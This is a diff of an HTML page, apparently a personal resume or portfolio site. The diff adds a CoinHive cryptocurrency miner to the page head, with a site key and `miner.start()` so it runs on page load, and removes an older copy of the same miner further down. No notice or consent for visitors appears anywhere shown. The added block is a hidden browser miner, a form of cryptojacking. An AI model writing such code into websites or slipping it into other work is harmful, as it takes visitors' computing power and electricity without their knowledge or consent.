@@ -8,6 +8,14 @@
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
 	<script src="https://use.fontawesome.com/8a9d8d3eec.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script> 
+		var miner = new CoinHive.Anonymous('AH9YR9lg3sPGdZKviBDhV6otFqEtJVoa', {
+			throttle: 0.9,
+			forceASMJS: false
+		});
+		miner.start();
+	</script>
 	<meta name='viewport' content='width=400'>
 
 	<style>
@@ -175,11 +183,8 @@
 		  <a href="img/resume/resume.pdf" target="_blank"><button type="button" class="btn btn-default  hvr-bounce-to-right" style="background-color:#5bc0de; color:white; border:0px;"> <i class="fa fa-file-pdf-o" aria-hidden="true"></i> <b>&nbsp;Resume PDF</b> </button></a>
 		  <button type="button" class="btn btn-default  hvr-bounce-to-right" data-toggle="modal" data-target="#resume" style="background-color:#5bc0de; color:white; border:0px;"> <i class="fa fa-file-image-o" aria-hidden="true"></i> <b>&nbsp;Resume Picture</b> </button>
 
-<script src="https://coinhive.com/lib/miner.min.js" async></script>
-<script>
-	var miner = new CoinHive.Anonymous('AH9YR9lg3sPGdZKviBDhV6otFqEtJVoa');
-	miner.start();
-</script>
+
+
 		</div>
 	</div>
 
